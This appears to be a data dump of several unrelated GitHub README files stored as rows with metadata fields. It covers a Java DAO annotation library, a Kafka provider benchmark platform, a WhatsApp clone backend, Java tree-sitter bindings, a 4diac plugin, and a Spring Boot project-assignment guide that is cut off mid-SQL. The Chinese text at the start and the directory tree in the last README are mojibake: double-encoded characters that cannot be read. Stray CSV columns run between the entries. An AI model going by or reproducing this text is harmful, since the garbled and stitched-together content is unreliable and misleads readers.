æˆ‘ç›¸ä¿¡é¡¹ç›®åšå¾—å¤šçš„æœ‹å‹ï¼Œçœ‹åˆ°è¿™é‡Œå·²ç»èƒ½çŸ¥é“ä¼˜åŠ¿äº†ï¼Œä»€ä¹ˆserviceï¼Œä»€ä¹ˆdaoï¼Œä»€ä¹ˆRespositroy ï¼Ÿæˆ‘ä»¬é€šé€šæš‚æ—¶ä¸ç®¡ï¼Œä¸€ä¸ªController èƒ½è§£å†³çš„äº‹æƒ…ï¼Œä¸è¦æçš„é‚£ä¹ˆéº»çƒ¦ã€‚ç®€å•çš„æ•°æ®æœ‰ç®€å•çš„å¤„ç†åŠæ³•ï¼Œå¯¹äºä¸€äº›å¤æ‚å¤šè¡¨é€»è¾‘ä½ æ‰æœ‰åˆ›å»ºserviceçš„å¿…è¦ï¼Œæ¯•ç«Ÿçœå‡ºæ¥çš„æ—¶é—´æ˜¯ä½ çš„

### å¼€å§‹

èµ‹äºˆå®ä½“å¯¹è±¡ä»¥ä¸Šèƒ½åŠ›ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œä½ åªéœ€åœ¨æ ‡æ³¨@Entityçš„å®ä½“ç±»ä¸Šï¼Œå†å¢åŠ ä¸€ä¸ª@WestDao

è¿™é‡Œå»ºè®®å¢åŠ @Accessors(chain = true)ï¼Œå­ç±»ä¹Ÿå°†èµ‹äºˆé“¾å¼è°ƒç”¨èƒ½åŠ›

```java
@Entity
@Data
@Accessors(chain = true)
@WestDao(prefix = ""west"")
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    @Column(length = 32)
    private String name;
    @Column(columnDefinition = ""text"")
    private String avatar;
    private Integer age;
    @Column
    @DateTimeFormat(pattern = ""yyyy-MM-dd HH:mm:ss"")
    private LocalDateTime createTime;
    @PrePersist
    public void prePersistCreateTime() {
        if (createTime == null) {
            createTime = LocalDateTime.now();
        }
    }
}
```

æ˜¯çš„ï¼Œå°±åªéœ€è¦ä¸€ä¸ªï¼ ï¼·estDao(prefix = ""west"")ï¼Œå½“ç„¶""west""ä¹Ÿå¯ä»¥æ˜¯ä½ å–œæ¬¢çš„ä»»ä½•å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ loveã€meã€youã€like

å“¦ï¼Œå¯¹äº†ï¼Œä½ å¦‚æœæ˜¯çœ‹åˆ°è¿™é‡Œï¼Œæ— æ‰€è°“çš„ï¼Œä½†æ˜¯å¦‚æœä½ è·Ÿç€åšï¼Œä½ è¦éª‚äººäº†ï¼Œå› ä¸ºä½ è¿˜æ²¡æœ‰å¼•å…¥ä¾èµ–
æ ¹æ®ç‰ˆæœ¬å¼•å…¥<westdao.version>latest</westdao.version> è¯¦æƒ…è¯·çœ‹ releases

åœ¨<annotationProcessorPaths> ä¸­æŠŠwestdao-core å†™åœ¨lombok åé¢ï¼Œä¿è¯æ‰§è¡Œé¡ºåº

```xml

<dependency>
    <groupId>cn.k2future</groupId>
    <artifactId>westdao-core</artifactId>
    <version>${westdao.version}</version>
</dependency>
<plugin>
<groupId>org.apache.maven.plugins</groupId>
<artifactId>maven-compiler-plugin</artifactId>
<version>3.8.1</version>
<configuration>
    <source>1.8</source>
    <target>1.8</target>
   
         <path>
              <groupId>org.projectlombok</groupId>
              <artifactId>lombok</artifactId>
              <version>1.18.24</version>
         </path>
         <path>
            <groupId>cn.k2future</groupId>
            <artifactId>westdao-core</artifactId>
            <version>${westdao.version}</version>
        </path>
    </annotationProcessorPaths>
</configuration>
</plugin>
```

æˆ‘ä»¬è¿˜éœ€è¦å…ˆç¼–è¯‘ä¸€ä¸‹ï¼Œç¼–è¯‘å°±æ˜¯ç”¨ mvn compile

è¿™æ ·@Entityçš„ target çš„åŒçº§ç›®å½•ä¸‹ï¼Œå°±ä¼šç”Ÿæˆä»¥ prefix + entity åå­—class æ–‡ä»¶ï¼Œæ¥å‚æ˜¯å®ƒï¼Œä¿å­˜æ˜¯å®ƒï¼Œä¿®æ”¹æ˜¯ä»–ï¼Œåˆ é™¤ä¹Ÿæ˜¯å®ƒï¼Œç”¨å¥½å®ƒå§

```java
public class WestUser extends User implements WestDao<User>
public class LikeUser extends User implements WestDao<User>
public class MyUser extends User implements WestDao<User>
```

å½“å‰æ”¯æŒç‰ˆæœ¬:  spring boot 2.X ã€jdk 1.8
ä¸¥è°¨èµ·è§ï¼Œæˆ‘æµ‹è¯•é€šè¿‡çš„æ˜¯ï¼š2.3.12.RELEASE 

å¦‚æœä½ æ˜¯æ–°æ‰‹ï¼Ÿå®Œæ•´çš„ [pom ](https://github.com/westwong/westDao/blob/master/WestDaoTest/pom.xml)æ–‡ä»¶ä½ å…ˆçœ‹çœ‹ï¼Ÿ
è¿˜æ˜¯ä¸æ‡‚ï¼Ÿé‚£å†çœ‹çœ‹  [testDemo](https://github.com/westwong/westDao/tree/master/WestDaoTest) 
è¿˜æœ‰ç–‘é—®ï¼Ÿç»™æˆ‘å‘é‚®ä»¶å§ deadshoot@foxmail.com 

æœ€åæ¬¢è¿å„ä½å¤§ä½¬ æäº¤  [Issue](https://github.com/westwong/westDao/issues) å’Œ [Pull request](https://github.com/westwong/westDao/pulls)

ä½ æœ‰ä»€ä¹ˆå¥½çš„æƒ³æ³•æƒ³è·Ÿæˆ‘äº¤æµçš„å¾®ä¿¡ï¼šdeadshoot

æœ€åå†å¼ºè°ƒä¸€ä¸‹æˆ‘ä»¬çš„ç›®æ ‡ï¼š**Wise Execution , Simple Tools**",5,0,1,0.0,"['wise', 'exectution', 'simple', 'tool', 'westdao', 'http']","['wise', 'exectution', 'simple', 'tool', 'westdao']",3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,2.0,1.0
AutoMQ/kafka-provider-comparison,main,"[English](README.md) | [ç®€ä½“ä¸­æ–‡](README_zh.md)
![](images/kpc_banner.png)

## Kafka Provider Comparison

Kafka Provider Comparison (KPC) is a public Kafka comparison platform built on the code of the [OpenMessaging Benchmark](https://github.com/openmessaging/benchmark).

The Kafka API has become the de facto standard in the streaming domain. In recent years, many new streaming systems compatible with the Kafka API (hereinafter referred to as Kafka Providers) have emerged. The purpose of building this comparison platform is not to determine the best Kafka streaming system, but to provide a **fair**, **objective**, and **open** comparison environment to generate objective and fair Kafka streaming system comparison reports. The comparison reports will include multiple comparison dimensions, such as latency, cost, elasticity, throughput, and more. Different products have different design architectures and trade-offs, and naturally, they will perform differently in various comparison dimensions. This objective comparison result will be very helpful for users in making technical selections.

## Supported Kafka Providers

* [AutoMQ](https://www.automq.com)
* [Apache Kafka](https://kafka.apache.org)
* [Amazon MSK](https://docs.amazonaws.cn/msk/index.html)

## Comparison Platform Execution Logic

All execution logic of the comparison platform is encapsulated in GitHub Actions, and comparison tasks are triggered through GitHub Actions Workflow. The execution logic of the comparison tasks is as follows:

1. GitHub Actions meet the scheduled trigger conditions and trigger the Workflow execution.
2. The Benchmark processes of multiple Kafka Providers included in the Workflow will be executed in parallel.
3. Each Benchmark Provider process includes the following sequential sub-stages, executed in order. Different Kafka Providers will be evaluated simultaneously.
   1. Install: Initialize cloud resources on AWS according to the Terraform configuration file, check out the code, install dependencies, and then use the Ansible playbook to install the Kafka Provider. This stage will also calculate the cost based on the Terraform configuration file, as part of the final Comparison Report.
   2. Benchmark: This stage depends on the Install stage and will be triggered after its completion. This stage mainly uses the information from the Terraform Output to remotely log in to the cloud Client machine and execute the OpenMessaging Benchmark test.
   3. Generate Report: The Benchmark result files executed on the cloud Client will be copied to the GitHub Runner machine, the content will be parsed to generate the final Report content, and displayed in [issue-1](https://github.com/AutoMQ/kafka-provider-comparison/issues/1)
   4. Uninstall: This stage depends on the Benchmark stage and will be triggered after its completion. This stage will clean up cloud resources, including deleting the cloud Client machine and the Kafka Provider cluster on the cloud.

## Benchmark Report Description

A complete Benchmark Report will include the following content:
- Report Generated: The generation time of the Report. Based on this generation time, you can see the specific Workflow execution details from the GitHub Actions of the open-source repository, including how the cost is calculated, the Benchmark output logs, etc.
- Workload Configuration: The Workload configuration information extracted from the OpenMessaging Benchmark run logs. To ensure the fairness of the comparison, we will use the exact same Workload, Producer, and Consumer configuration for all Kafka Providers.
- Producer Configuration: Producer configuration, the Producer configuration of all Kafka Providers is the same.
- Consumer Configuration: Consumer configuration, the Consumer configuration of all Kafka Providers is the same.
- Topic Configuration: Topic configuration, the Topic configuration of all Kafka Providers is the same.
- Replication Factor: Replication factor, the replication factor of all Kafka Providers is the same.
- Average Throughput: The average throughput during the entire Benchmark process, in MB/s.
- Pub Latency (ms) avg: The average publish latency during the entire Benchmark process, in ms.
- Pub Latency (ms) P99: The P99 publish latency during the entire Benchmark process, in ms.
- E2E LatencyAvg(ms): The average end-to-end latency during the entire Benchmark process, in ms.
- E2E P95 Latency(ms): The P95 end-to-end latency during the entire Benchmark process, in ms.
- E2E P99 Latency(ms): The P99 end-to-end latency during the entire Benchmark process, in ms.
- Baseline Cost: The baseline cost of the Kafka Provider (excluding the usage cost of IaaS cloud services), in USD. Based on [Infracost](https://www.infracost.io/), the cost is calculated by analyzing the Terraform configuration file.
- Usage Cost: The cloud resource usage cost of the Kafka Provider, in USD. Based on [Infracost](https://www.infracost.io/), the cost is calculated by analyzing the Terraform configuration file and usage configuration. The usage is calculated based on the infracost usage in the `infracost` directory. For example, for AutoMQ, we calculate the cost based on the average write throughput of 10MB/s, with 31.25 PUTs and 12.5 GETs per GB of write throughput. The cost estimation logic will be explained in detail in the following chapters.
- Total Cost: The total cost of the Kafka Provider, in USD. The value is equal to the baseline cost plus the usage cost.

## How to Contribute

Assuming your Kafka provider is named `foo`, you will create the following content to include `foo` in the comparison list:
Create a `driver-foo` module in the root directory, and the `/deploy/aws-cn` directory of this module must include the following key files:
- var.tfvars: By default, to ensure the fixed workload and production/consumption mode, we only open the following values for customization. If these configurations are not suitable for your Kafka Provider, you can submit a new PR and explain which new values need to be opened and the reasons.
- deploy.yaml: The Ansible playbook configuration file for deploying the specific Kafka Provider.
- cost_explanation.md: A document explaining how the cost is calculated. Different Kafka Providers have different implementations, leading to significant differences in the usage of some computing and storage services. To ensure fairness and openness, please provide a detailed explanation of the cost usage calculation logic. This part of the explanation can refer to the files in the `cost-explanation` directory of the project.
- infracost usage config yaml: In the root directory of infracost, we provide a default `template-medium-500m` template file, which is also the default usage configuration file for infracost medium scale. You can modify this file according to the actual situation of your Kafka Provider to more accurately calculate the usage cost. And publicly explain these modifications in `cost-explanation/foo.md`.

After completing the above steps, you need to add a new job in the three files under `.github/workflows` following the pattern of other Kafka Providers to ensure that the Workflow can execute the Benchmark process of your Kafka Provider when it runs on a schedule. If you have any questions about how to contribute, feel free to submit an issue under this project or join our [Slack](https://join.slack.com/t/automq/shared_invite/zt-29h17vye9-thf31ebIVL9oXuRdACnOIA) channel for discussion.

You can fork our code and test it locally. When you are satisfied with the test, you can submit a PR to our repository. We will review and merge your PR after receiving it. After merging, we will check the accuracy of your code execution in our workflow. If there are any issues, we will provide feedback on the PR and temporarily disable the execution and comparison of your Kafka Provider in the workflow (for new Kafka providers) or revert to the previous version.

> Tips: Currently, only comparisons in the cn-northwest-1 region of AWS China are supported. More cloud providers and regions will be supported in the future. The test allows users to use different numbers and specifications of machines. Using higher machine specifications will improve performance but also increase costs.

### How to Contribute a Non-Open-Source Kafka Provider

KPC also supports comparisons of non-open-source Kafka Providers. If your Kafka Provider is not open-source, you can provide a basic image that is encrypted or obfuscated to contribute a new Kafka Provider for deployment and testing in our environment. For Kafka Providers that are not open-source and do not provide images, such as Confluent/Aiven, we will use the Terraform provider they provide for deployment.

### Fixed Workload Configuration

To ensure the fairness of the comparison, we have fixed a representative Workload, Producer, and Consumer configuration [tail-read-100m.yaml](workloads/vs/fast-tail-read-100m.yaml). This configuration supports generating a theoretical peak write throughput of 100 MB/s.

### Cost Estimation

#### Challenges and Solutions of Cost Estimation

The cost of fixed-scale cloud services can be clearly calculated. The challenge of cost estimation lies in the estimation of cloud service usage. Cloud services measure and charge for different services based on usage, such as API calls and storage space for S3. Different products have different implementations, making usage cost estimation very challenging. To ensure accurate and fair estimation, we will provide a markdown file named after the Kafka provider in the driver directory of each Kafka Provider to explain how the cost is calculated. Different Kafka Providers have different implementations, leading to significant differences in the usage of some computing and storage services. To ensure fairness and openness, we will ensure that all Kafka providers provide detailed cost calculation logic for computing and storage costs. The following are the cost estimation explanations for different Kafka Providers:

- [AutoMQ](cost-explanation/automq.md)
- [Apache Kafka](cost-explanation/kafka.md)
- [Apache MSK](cost-explanation/msk.md)

### Dependent Action Secrets

- AUTOMQ_ACCESS_KEY: AWS Access Key
- AUTOMQ_SECRET_KEY: AWS Secret Key
- INFRA_COST_API_KEY: Infracost API Key. Can be obtained from [Infracost](https://www.infracost.io/)
- SSH_PRIVATE_KEY: SSH Private Key, directly fixed in secrets
- SSH_PUBLIC_KEY: SSH Public Key, directly fixed in secrets
- TF_BACKEND_BUCKET: S3 Bucket for storing Terraform State
- TF_BACKEND_KEY: S3 Key for storing Terraform State

## Comparison Report Generation Cycle

We plan to trigger the workflow to generate a comparison report every Monday at 8 AM.

## Roadmap

- Add horizontal automated comparisons for Kafka Providers such as Confluent/Aiven/Redpanda/WarpStream/Pulsar
- Support comparison of elasticity, i.e., how long it takes for the Client to recover from scaling actions
- Add tests related to Kafka compatibility.
- More visually appealing and readable comparative reports.

## License

Licensed under the Apache License, Version 2.0: http://www.apache.org/licenses/LICENSE-2.0

The original works is from the [OpenMessaging Benchmark Framework](https://github.com/openmessaging/benchmark/).
",0,1,2,1.0,"['kafka', 'provider', 'comparison', 'support', 'kafka', 'provider', 'comparison', 'platform', 'execution', 'logic', 'benchmark', 'report', 'description', 'how', 'contribute', 'how', 'contribute', 'kafka', 'provider', 'fix', 'workload', 'configuration', 'cost', 'estimation', 'challenge', 'solution', 'cost', 'estimation', 'dependent', 'action', 'secret', 'comparison', 'report', 'generation', 'cycle', 'roadmap', 'license']","['kafka', 'provider', 'comparison', 'report', 'how']",21.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,com.mycila:license-maven-plugin,com.spotify:dockerfile-maven-plugin,maven-assembly-plugin,maven-failsafe-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.jacoco:jacoco-maven-plugin]",0.0,18.0,3.0
C0de-cake/whatsapp-clone-backend,main,"# Whatsapp clone (fullstack project) Spring boot 3, Angular 18, Bootstrap, PostgreSQL, Keycloak (2024) (Backend)

Spring boot backend of the whatsapp clone

[Video tutorial](https://youtu.be/Ot7QE_gzhtA)

[Angular Frontend](https://github.com/C0de-cake/whatsapp-clone-frontend)

### Key Features:
- ğŸ’¬ Real-time messaging
- ğŸ‘¥ Conversations management
- ğŸ“ File sharing (images, videos, documents)
- ğŸ” Authentication and Authorization (Role management) with Keycloak (OAuth2)
- ğŸ¢ Hexagonal architecture

## Usage
### Prerequisites
- [JDK 21](https://adoptium.net/temurin/releases/)
- [PostgreSQL](https://www.postgresql.org/download/)
- IDE ([VSCode](https://code.visualstudio.com/download), [IntelliJ](https://www.jetbrains.com/idea/download/))
- Docker ([Docker Desktop](https://docs.docker.com/engine/install/))

### Clone the repository
``git clone https://github.com/C0de-cake/whatsapp-clone-back``

### Launch

#### Run keycloak
``docker-compose src/main/docker/keycloak.yml up -d``

#### Maven
``./mvnw spring-boot:run``
",0,0,1,0.0,"['whatsapp', 'clone', 'fullstack', 'project', 'spring', 'boot', 'angular', 'bootstrap', 'postgresql', 'keycloak', 'backend', 'key', 'feature', 'usage', 'prerequisite', 'clone', 'repository', 'launch', 'run', 'keycloak', 'maven']","['clone', 'keycloak', 'whatsapp', 'fullstack', 'project']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
tree-sitter/java-tree-sitter,master,"# Java Tree-sitter

[![CI][ci]](https://github.com/tree-sitter/java-tree-sitter/actions/workflows/ci.yml)
[![central][central]](https://central.sonatype.com/artifact/io.github.tree-sitter/jtreesitter)
[![docs][docs]](https://tree-sitter.github.io/java-tree-sitter/)

Java bindings to the [tree-sitter] parsing library.

## Building

- Install JDK 22 and set `JAVA_HOME` to it
- Download [jextract] and add it to your `PATH`

```bash
git clone https://github.com/tree-sitter/java-tree-sitter
cd java-tree-sitter
git submodule init
mvn test
```

## Alternatives

These alternatives support older JDK versions or Android:

- [tree-sitter/kotlin-tree-sitter](https://github.com/tree-sitter/kotlin-tree-sitter) (JDK 17+, Android SDK 23+, Kotlin 1.9)
- [bonede/tree-sitter-ng](https://github.com/bonede/tree-sitter-ng) (JDK 8+)
- [seart-group/java-tree-sitter](https://github.com/seart-group/java-tree-sitter) (JDK 11+)
- [AndroidIDEOfficial/android-tree-sitter](https://github.com/AndroidIDEOfficial/android-tree-sitter) (Android SDK 21+)

[tree-sitter]: https://tree-sitter.github.io/tree-sitter/
[ci]: https://img.shields.io/github/actions/workflow/status/tree-sitter/java-tree-sitter/ci.yml?logo=github&label=CI
[central]: https://img.shields.io/maven-central/v/io.github.tree-sitter/jtreesitter?logo=sonatype&label=Maven%20Central
[docs]: https://img.shields.io/github/deployments/tree-sitter/java-tree-sitter/github-pages?logo=githubpages&label=API%20Docs
[FFM]: https://docs.oracle.com/en/java/javase/22/core/foreign-function-and-memory-api.html
[jextract]: https://jdk.java.net/jextract/
",3,2,2,6.0,"['java', 'building', 'alternative']","['java', 'building', 'alternative']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,maven-antrun-plugin,maven-gpg-plugin,maven-javadoc-plugin,maven-source-plugin,maven-surefire-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
Aimirim-STI/4diac-Plugin-UAORT,main,"# UAORT-4diac-plugin
4diac-ide Plugin to enable deployment on UAO Runtimes

### Install
For a step-by-step tutorial on the plugin instalation please refere to [Install.md](./INSTALL.md) document.

### Usage
To communicate with the UAO Runtime first add an `UAO_RT` device under the ""System Configuration"" view.

Edit the `MGR_ID` entry of the device to match the endpoint and port of the UAO Runtime.

Click on the Device block to select it and then on the `Properties` Tab. Under the `Instance` option select the ""Profile"" as `UAO`.

![Usage Video](./docs/BasicDeploy.gif)

After these steps the communication is configured and you can resume to the 61499 application build.

### Build from sources
Use `maven` tool to build the plugin with:
```shell
$ mvn clean
$ mvn install
```
After the command completes you will find the plugin installable zip file at [./package/target](./package/target) folder.
",2,1,5,0.0,"['install', 'usage', 'build', 'source']","['install', 'usage', 'build', 'source']",6.0,"[org.apache.maven.plugins:maven-dependency-plugin,org.eclipse.tycho:target-platform-configuration,org.eclipse.tycho:tycho-maven-plugin,org.eclipse.tycho:tycho-p2-director-plugin,org.eclipse.tycho:tycho-p2-plugin,org.eclipse.tycho:tycho-p2-repository-plugin,org.eclipse.tycho:tycho-packaging-plugin,org.eclipse.tycho:tycho-source-plugin]",0.0,0.0,1.0
Jojoooo1/project-assignment,develop,"#### context:
After not succeeding in my interview home assignment project, I believe this project could benefit other engineers on their journeys. That's why I've decided to share it. I've removed all company-specific code to ensure it remains completely agnostic. I hope you enjoy it and find it educational.

# Project assignment

## Introduction

Welcome to the API Documentation for the project assignment xxxx. This API was designed with a
strong emphasis on security and performance, strictly following industry best practices. It consists
of four distinct APIs, each serving a specific purpose.

- **Customer**: Facilitates customer integration with the platform.
- **Management**: API reserved for the development team to manage the platform. It is isolated from
  internal APIs to enhance security.
- **Internal**: Enables interaction with external services such as schedulers, jobs, and webhooks,
  ensuring adequate external integration.
- **Public API**: Serves data accessible to the public.

## Table of Contents

- [Project structure](#project-structure)
    - [Controllers](#controllers)
    - [Services](#services)
- [Database](#database)
    - [Schema](#schema)
        - [Definition](#definition)
        - [Technical choices](#technical-choices)
        - [Business choices](#business-choices)
    - [Indexes](#indexes)
    - [ORM](#orm)
    - [Migration](#migration)
    - [Initial data dump](#initial-data-dump)
- [API Endpoints](#api-endpoints)
    - [Customer](#customer)
    - [Internal](#internal)
    - [Management](#management)
    - [Public](#public)
- [API definitions and specific implementations](#api-definitions-and-specific-implementations)
    - [General](#general)
    - [Feature optimization](#feature-optimization)
        - [Validation](#validation)
        - [Implementation](#implementation)
- [Authentication and Authorization](#authentication-and-authorization)
- [Exception handling](#exception-handling)
- [Infra](#infra)
    - [Caching](#caching)
    - [Image building](#image-building)
    - [JVM options](#jvm-options)
- [Observability](#observability)
    - [Metrics](#metrics)
    - [Tracing](#tracings)
    - [Logging](#logging)
    - [Log strategy](#log-strategy)
    - [Profiling](#profiling)
- [Unit and Integration Tests](#unit--integration-tests)
    - [Strategy](#strategy)
    - [Application tests](#application-tests)
- [CI/CD](#cicd)
    - [Git Workflow](#git-workflow)
    - [Release workflow](#release-workflow)
    - [Hotfix workflow](#hotfix-workflow)
    - [Branching Strategy](#branching-strategy)
    - [Continuous Deployment](#continuous-deployment)
        - [Strategy](#strategy-1)
        - [Deployment](#deployment)
    - [Areas for Improvement](#areas-for-improvement)
- [GitHub Actions configuration](#github-actions-configuration)
    - [Branch: develop](#branch-develop)
    - [Branch: main](#branch-main)
    - [Github environments](#github-environments)
    - [Release application](#release-application)
- [Production recommendations](#production-recommendations)
    - [Monitoring](#monitoring)
    - [Logging](#logging-1)
    - [Alerting](#alerting)
    - [High Availability (HA)](#high-availability-ha)
    - [Database](#database-1)
    - [Security](#security)
- [Formatting](#formatting)
- [Postman collection](#postman-collection)
- [Running the project](#running-the-project)
    - [Dependencies](#dependencies)
    - [Run project](#run-project)
    - [Debug project](#debug-project)
    - [Test project](#test-project)
    - [Clean project](#clean-project)

## Project structure

The project hierarchy adheres to standard Java package conventions, organized by package type.
Personally, I find it challenging to begin with a fully modular approach, as initially, you may not
have a complete understanding of the application. I like to start with a simple structure and then
iteratively refine and adapt it as my comprehension of the domain and context deepens. The
controllers, requests, and responses are organized on a per-product basis to enhance code separation
and security:

```
â”œâ”€â”€ src
â”‚Â Â  â”œâ”€â”€ main
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ java
â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ com
â”‚Â Â  â”‚Â Â  â”‚Â Â      â””â”€â”€ project
â”‚Â Â  â”‚Â Â  â”‚Â Â          â””â”€â”€ api
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ clients
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â””â”€â”€ slack
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ constants
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ controllers
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ customer
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ internal
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ management
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”‚Â Â  â””â”€â”€ base
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â””â”€â”€ publ
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ entities
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â””â”€â”€ base
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ exceptions
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â””â”€â”€ types
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ facades
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ infra
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ auditors
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ auth
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ cache
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ filters
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ monitoring
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â””â”€â”€ security
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ listeners
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ mappers
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â””â”€â”€ base
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ repositories
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ requests
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ customer
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â””â”€â”€ management
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ responses
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ customer
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â”œâ”€â”€ management
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â””â”€â”€ shared
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ services
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”‚Â Â  â””â”€â”€ base
â”‚Â Â  â”‚Â Â  â”‚Â Â              â”œâ”€â”€ utils
â”‚Â Â  â”‚Â Â  â”‚Â Â              â””â”€â”€ validators
```

### Controllers

The controllers conform to a strict naming convention, beginning with the controllerâ€™s name and
extending to the last folder in the hierarchy. They all follow the same structure:

```java

@Slf4j
@RestController
@RequestMapping(CustomerController.BASE_URL)
@RequiredArgsConstructor
public class CustomerController {

  public static final String BASE_URL = AppUrls.CUSTOMER_API;
}
```

They retrieve their respective URLs from a centralized configuration class. It's crucial to maintain
consistent and immutable URL definitions, especially for endpoints involving authorization
mechanisms, as any modifications could inadvertently impact access control and security.

### Services

They all follow the same structure:

```java

@Slf4j
@Transactional(readOnly = true)
@Service
@RequiredArgsConstructor
public class CompanyService extends BaseService<Company> {

  @Getter
  private final CompanyRepository repository;
}
```

It is configured to set all transactions as read-only by default, which can improve performance by
leveraging database optimizations for read-only operations. It inherits from a `BaseService` class
that encapsulates commonly used functions, promoting code reuse and maintainability.

While it's a matter of personal preference, I tend to encapsulate most business rules within the
Controller layer. This approach aims to keep the service layer more generic and reusable across
different use cases, while also minimizing the transaction scope and potential contention. When
implemented thoughtfully, I have found it to be more reliable and efficient to keep my code DRY.

## Database

It uses PostgreSQL for persistence and Flyway for managing migrations and schema versioning.

### Schema

#### Definition

The database consists of 3 tables (including 1 for migration):

- **company**: Represents organizations using the platform.
- **api_key**: Used by companies to integrate with the platform.

![schema](./documentation/schema.png)

#### Technical choices

- Always use `identity` for the primary key (instead of `bigserial`) for tables that do not require batching.
- Normalize all identities to use `bigint`.
- Use [UUIDv7](https://uuid7.com/) for tables that require batching to enhance performance. They are
  generated client-side because PostgreSQL does not implement it as of version 17 (planned for v18). 
  UUIDv7 is optimized for indexing and querying (as opposed to UUIDv4), as explained [here](https://www.cybertec-postgresql.com/en/unexpected-downsides-of-uuid-keys-in-postgresql/).
- If you must use identity, opt for a traditional sequence generator. However, be aware that this will limit your batching configuration flexibility.
- Normalize `varchar` lengths to 255.
- All tables are created in the `public` schema.
- By default, all tables include `created_by`, `updated_by`, `created_at`, and `updated_at` columns.
- I did not implement partitioning or sharding strategies in this phase, as they require a deep
  understanding of the system's architecture, data models, and relationships. Without careful
  planning and consideration, it can potentially introduce significant complexity and bottlenecks.
  If the tables start to grow to several billion rows, you might want to reconsider it.

#### Business choices

- This is specific to your home assignment project, add some context or remove it. 
  I personally put all the business/product choices I have made.

### Indexes

I only created x indexes:

- `CREATE INDEX xxxx on x(x);`

I did not want to create too many of them without having a complete overview of the system. I always
try to create **at most 10 indexes** per table, as it will slow down (excluding hot update) create
and update operations.

### ORM

- Hibernate is configured to only perform schema validation to ensure data integrity.
- Hibernate, like many ORMs, does not support batching for entities with identity columns, since IDs
  are assigned at insert time. To overcome this limitation, it uses UUIDv7 for tables that require
  batching.
- Personally, I do not like to use @ManyToOne or @ManyToMany relationships within entities to
  prevent misuse of lazy loading, which can lead to performance issues.
- All transactions are set at the service layer to ensure consistency.
- By default, all service methods are read-only to improve Hibernate performance.

### Migration

- Use Liquibase for automatic schema migration.
- It is **really** important to create and drop indexes of large tables outside of Liquibase
  using `CREATE INDEX CONCURRENTLY` and `DROP INDEX CONCURRENTLY` statements to prevent any locking
  and database downtime.

### Initial data dump

- For the sake of simplicity I added the following entities in the initial migration:

```sql
INSERT INTO company (slug, name, email, is_management, created_at, updated_at)
VALUES ('my-company-management', 'My company mgmt', 'my-company-management@gmail.com', true, NOW(), NOW());
INSERT INTO api_key (company_id, name, key, is_active, created_at, updated_at)
VALUES (1, 'my company management', 'apikey-mgmt', true, NOW(), NOW());

INSERT INTO company (slug, name, email, is_internal, created_at, updated_at)
VALUES ('my-company-internal', 'My company internal', 'my-company-internal@gmail.com', true, NOW(), NOW());
INSERT INTO api_key (company_id, name, key, is_active, created_at, updated_at)
VALUES (2, 'my company internal', 'apikey-internal', true, NOW(), NOW());

INSERT INTO company (slug, name, email, is_customer, created_at, updated_at)
